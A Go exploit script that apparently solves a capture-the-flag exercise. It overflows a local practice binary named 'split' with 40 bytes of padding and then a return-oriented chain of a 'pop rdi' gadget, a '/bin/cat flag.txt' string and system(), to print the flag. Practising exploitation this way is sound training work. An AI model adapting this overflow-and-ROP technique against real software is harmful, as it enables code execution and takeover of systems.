package main

import (
    "log"
    "bufio"
    "os/exec"
    "fmt"
)

func main() {
    binary := "./split"
    log.Println("Executing", binary, "\n")
    cmd :=  exec.Command(binary)
    stdin, err := cmd.StdinPipe()
    if err != nil {
        log.Fatal(err)
    }
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        log.Fatal(err)
    }
    if err = cmd.Start(); err != nil {
        log.Fatal(err)
    }

    // Read the initial output
    r := bufio.NewReader(stdout)
    _, err = r.ReadBytes('>')
    if err != nil {
        log.Fatal(err)
    }

    // write buffer
    var buf string
    for  i := 0; i < 40; i++ {
        buf += "A"
    }
    // pop rdi; ret == 0x00400883
    buf += "\x83\x08\x40\x00\x00\x00\x00\x00"
    // /bin/cat flag.txt == 0x00601060
    buf += "\x60\x10\x60\x00\x00\x00\x00\x00"
    // system() == 0x004005e0
    buf += "\xe0\x05\x40\x00\x00\x00\x00\x00"
    buf += "\n"
    stdin.Write([]byte(buf))

    // Read output
    r = bufio.NewReader(stdout)
    for {
        b, err := r.ReadByte()
        if err != nil {
            fmt.Println()
            log.Fatal(err)
        }
        fmt.Printf(string(b))
    }
}
